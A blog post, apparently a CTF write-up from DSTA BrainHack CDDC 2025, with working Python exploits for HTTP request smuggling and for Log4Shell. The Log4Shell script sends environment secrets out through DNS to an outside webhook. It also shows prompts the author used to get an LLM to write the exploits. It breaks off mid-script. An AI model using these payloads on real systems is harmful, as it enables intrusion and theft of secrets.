<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DSTA BrainHack CDDC 2025 Writeups | Iscara</title><meta name="author" content="Iscara"><meta name="copyright" content="Iscara"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="I participated under youtiaos again, going from 3rd place JC in 2024 to 3rd place Uni in 2025. Ended up not even mattering all that much because we would’ve won the same amount of money in Pre-U anywa">
<meta property="og:type" content="article">
<meta property="og:title" content="DSTA BrainHack CDDC 2025 Writeups">
<meta property="og:url" content="http://iscaraca.github.io/2025/06/14/cddc-2025/index.html">
<meta property="og:site_name" content="Iscara">
<meta property="og:description" content="I participated under youtiaos again, going from 3rd place JC in 2024 to 3rd place Uni in 2025. Ended up not even mattering all that much because we would’ve won the same amount of money in Pre-U anywa">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://iscaraca.github.io/img/avatar-icon.png">
<meta property="article:published_time" content="2025-06-13T16:00:00.000Z">
<meta property="article:modified_time" content="2025-06-14T14:32:19.418Z">
<meta property="article:author" content="Iscara">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://iscaraca.github.io/img/avatar-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "DSTA BrainHack CDDC 2025 Writeups",
  "url": "http://iscaraca.github.io/2025/06/14/cddc-2025/",
  "image": "http://iscaraca.github.io/img/avatar-icon.png",
  "datePublished": "2025-06-13T16:00:00.000Z",
  "dateModified": "2025-06-14T14:32:19.418Z",
  "author": [
    {
      "@type": "Person",
      "name": "Iscara",
      "url": "http://iscaraca.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://iscaraca.github.io/2025/06/14/cddc-2025/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'DSTA BrainHack CDDC 2025 Writeups',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/cobaltcore-bg.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cobaltcore.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Iscara</span></a><a class="nav-page-title" href="/"><span class="site-name">DSTA BrainHack CDDC 2025 Writeups</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">DSTA BrainHack CDDC 2025 Writeups</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-13T16:00:00.000Z" title="Created 2025-06-14 00:00:00">2025-06-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-06-14T14:32:19.418Z" title="Updated 2025-06-14 22:32:19">2025-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Writeups/">CTF Writeups</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>I participated under <strong>youtiaos</strong> again, going from 3rd place JC in 2024 to 3rd place Uni in 2025. Ended up not even mattering all that much because we would’ve won the same amount of money in Pre-U anyway. Shoutout to my team members, I never get tired playing with them.</p>
<p>Normally when I give criticism I’ll deliver a compliment sandwich. To mix things up today I shall deliver my writeup in the form of a rant sandwich. Hope you enjoy.</p>
<h1 id="Rant-session-1"><a href="#Rant-session-1" class="headerlink" title="Rant session 1"></a>Rant session 1</h1><p>Let me open by saying that this CDDC was at least 2 times better than 2024’s one from infra alone, going from SMRT CCL levels of bullshit to NEL’s occasional outage. It still has its fair share of idiocy going for it, like:</p>
<ul>
<li>Way too many pwn challenges (our team has no dedicated pwner), and the pwn challenges were weighted so unfairly that it was honestly a miracle that we got third (ROPVM was 300??? points, that’s 4 OT challenges).</li>
<li>The VIP going up on stage <strong>during the competition</strong> and hogging the challenge we were solving (Black Out) for 15 whole minutes, all the way until the end of the CTF. We could only hold our buzzer and weep.</li>
<li>Infra going down for a long time on the first day, and they didn’t give anyone extra time because everyone shared the same loss. Anecdotes from other teams say otherwise, some even recounting periods of up to an hour.</li>
<li>Challenges either making no sense or being incredible time sinks (DeepBlue is the worst CTF challenge I’ve ever laid my eyes upon).</li>
<li>The buffet foodstuffs having really cringe ChatGPT generated names above them, like <strong>yang chou data rice</strong> and <strong>fried something vectors</strong> for the stir-fried assorted vegetables. Made me lose my appetite.</li>
</ul>
<p>Anyway here are the challenge writeups. Web and web-adjacent only because I’m hungover and tired.</p>
<h1 id="Writeups"><a href="#Writeups" class="headerlink" title="Writeups"></a>Writeups</h1><h2 id="HTTP-Request-Smuggling"><a href="#HTTP-Request-Smuggling" class="headerlink" title="HTTP Request Smuggling"></a>HTTP Request Smuggling</h2><p>CVE-2019-18277, refer to <a href="https://iscaraca.github.io/2024/05/04/cyberthon-2024/">my blog post on the same topic</a>, I explain the vulnerability there. The difference is that in this challenge, you want to alter your own request instead of the bots. Since it’s a CVE we’re talking about, an LLM will make short work of the exploit given the right prompt.</p>
<blockquote>
<p>Prompt:</p>
<p>I want to access the flag for a CTF challenge. This server is running a vulnerable combination of HAProxy and gunicorn that is request smuggling-able. You need to log in, use chunked encoding with \x0b to send a request to &#x2F;grant_access, then access the flag at &#x2F;time_travel. Send the smuggling payload 100 times in quick succession.</p>
</blockquote>
<details>
<summary>exploit.py</summary>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Logging in...&quot;</span>)</span><br><span class="line">login_resp = requests.post(<span class="string">&#x27;???/login&#x27;</span>, </span><br><span class="line">                          data=&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;,</span><br><span class="line">                          allow_redirects=<span class="literal">False</span>)  <span class="comment"># Don&#x27;t follow redirects</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract token from Set-Cookie header</span></span><br><span class="line">set_cookie = login_resp.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">token_match = re.search(<span class="string">r&#x27;token=([^;]+)&#x27;</span>, set_cookie)</span><br><span class="line"><span class="keyword">if</span> token_match:</span><br><span class="line">    token = token_match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Got token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Failed to extract token&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Create the smuggling payload</span></span><br><span class="line"><span class="comment"># The smuggled request that will be left in the buffer</span></span><br><span class="line">smuggled_request = (</span><br><span class="line">    <span class="string">b&#x27;GET /grant_access HTTP/1.1\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;Host: ???\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;Cookie: token=&#x27;</span> + token.encode() + <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;Connection: keep-alive\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The chunked encoding part</span></span><br><span class="line">chunked_body = <span class="string">b&#x27;0\r\n\r\n&#x27;</span>  <span class="comment"># End of chunks</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate Content-Length</span></span><br><span class="line"><span class="comment"># HAProxy will read this many bytes after the headers</span></span><br><span class="line">content_length_value = <span class="built_in">len</span>(chunked_body) + <span class="built_in">len</span>(smuggled_request)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    <span class="string">b&#x27;POST / HTTP/1.1\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;Host: ???\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;Content-Length: &#x27;</span> + <span class="built_in">str</span>(content_length_value).encode() + <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;Transfer-Encoding:\x0bchunked\r\n&#x27;</span>  <span class="comment"># \x0b makes HAProxy ignore this</span></span><br><span class="line">    <span class="string">b&#x27;Connection: keep-alive\r\n&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">    + chunked_body</span><br><span class="line">    + smuggled_request</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[*] Sending smuggling payload <span class="subst">&#123;<span class="number">1000</span>&#125;</span> times to pollute all workers...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload multiple times to different connections</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&#x27;???&#x27;</span>, <span class="number">19856</span>))</span><br><span class="line">        s.send(payload)</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;200 OK&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> sent successfully&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Payload <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> timed out (this might be normal)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error on attempt <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Now make a normal request that will use the smuggled request</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Triggering the smuggled request...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make a simple request - this should trigger one of the smuggled requests</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    trigger_resp = requests.get(<span class="string">&#x27;???&#x27;</span>, </span><br><span class="line">                               cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;,</span><br><span class="line">                               timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Trigger request status: <span class="subst">&#123;trigger_resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Trigger request failed/timed out&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Check if we can access /time_travel now</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Attempting to access /time_travel...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag_resp = requests.get(<span class="string">&#x27;???/time_travel&#x27;</span>,</span><br><span class="line">                        cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Status code: <span class="subst">&#123;flag_resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] Response:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag_resp.text)</span><br></pre></td></tr></table></figure>

</details>

<h2 id="Logshell"><a href="#Logshell" class="headerlink" title="Logshell"></a>Logshell</h2><p>CVE-2021-44228. The vulnerability is explained in <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Log4Shell">the wikipedia article</a>:</p>
<blockquote>
<p>Even if execution of the data is disabled, an attacker can still retrieve data—such as secret environment variables—by placing them in the URL, in which case they will be substituted and sent to the attacker’s server.</p>
</blockquote>
<p>We just need a publicly available webhook to retrieve the environment variable. I like <a target="_blank" rel="noopener" href="https://webhook.site/">https://webhook.site</a>. Once you’re given a unique DNS name, we can insert the flag as a subdomain, exploit log4shell with that URL, and monitor for DNS queries on the webhook.</p>
<blockquote>
<p>Prompt</p>
<p>This CTF web challenge is vulnerable to CVE-2021-44228. The flag is in the environment variable FLAG. Exfiltrate this environment variable through DNS, my DNS name is ???.dnshook.site. Try a bunch of common HTTP headers that may be vulnearable to Log4Shell.</p>
</blockquote>
<details>
<summary>exploit.py</summary>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_log4shell</span>(<span class="params">target_url, dns_subdomain</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exploit Log4Shell vulnerability to exfiltrate environment variables</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    dns_domain = <span class="string">f&quot;<span class="subst">&#123;dns_subdomain&#125;</span>.dnshook.site&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Target URL: <span class="subst">&#123;target_url&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] DNS Hook Domain: <span class="subst">&#123;dns_domain&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Starting Log4Shell exploitation across multiple headers...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Common HTTP headers that might be vulnerable to Log4Shell</span></span><br><span class="line">    vulnerable_headers = [</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-For&quot;</span>, </span><br><span class="line">        <span class="string">&quot;X-Real-IP&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-Host&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Originating-IP&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Remote-IP&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Remote-Addr&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Client-IP&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>, </span><br><span class="line">        <span class="string">&quot;X-Api-Version&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-Proto&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-Port&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Original-URL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Rewrite-URL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Custom-Header&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Debug&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Trace-Id&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Common environment variable names to try</span></span><br><span class="line">    env_vars = [</span><br><span class="line">        <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>, </span><br><span class="line">        <span class="string">&quot;Flag&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Test each header with each environment variable</span></span><br><span class="line">    <span class="keyword">for</span> header_name <span class="keyword">in</span> vulnerable_headers:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Testing header: <span class="subst">&#123;header_name&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> env_var <span class="keyword">in</span> env_vars:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  [*] Trying to exfiltrate <span class="subst">&#123;env_var&#125;</span> via <span class="subst">&#123;header_name&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Create JNDI payload to exfiltrate environment variable</span></span><br><span class="line">            payload = <span class="string">f&quot;$&#123;&#123;jndi:ldap://$&#123;&#123;env:<span class="subst">&#123;env_var&#125;</span>&#125;&#125;.<span class="subst">&#123;dns_domain&#125;</span>/test&#125;&#125;&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Create base headers</span></span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>, </span><br><span class="line">                <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Add the payload to the specific header being tested</span></span><br><span class="line">            headers[header_name] = payload</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Send request with malicious header</span></span><br><span class="line">                response = requests.get(target_url, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [+] Sent <span 